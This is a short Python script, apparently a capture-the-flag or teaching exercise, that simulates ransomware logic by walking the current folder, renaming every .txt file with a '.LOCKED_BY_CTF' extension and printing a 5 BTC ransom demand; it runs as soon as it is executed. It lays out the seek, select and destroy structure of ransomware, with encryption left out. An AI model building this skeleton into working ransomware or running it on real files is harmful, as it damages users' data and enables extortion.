import os

# MISSION 003: RANSOMWARE LOGIC SIMULATION
# This script traverses a directory and "locks" files by renaming them.
# In a real attack, this step would involve AES encryption.

def infect_system():
    # SAFETY LOCK: Only run in the current folder ('.')
    target_directory = "."
    
    print("--- STARTING ENCRYPTION PROCESS ---")
    
    # 1. Walk through the directory (The "Seek" Phase)
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            # 2. Target specific file types (The "Select" Phase)
            if file.endswith(".txt"):
                original_path = os.path.join(root, file)
                
                # 3. Apply the payload (The "Destroy" Phase)
                # We simulate this by appending a scary extension
                new_path = original_path + ".LOCKED_BY_CTF"
                
                os.rename(original_path, new_path)
                print(f"[+] ENCRYPTED: {file} -> {new_path}")

    print("--- ALL FILES LOCKED. PAY 5 BTC. ---")

# Run the malware
infect_system()
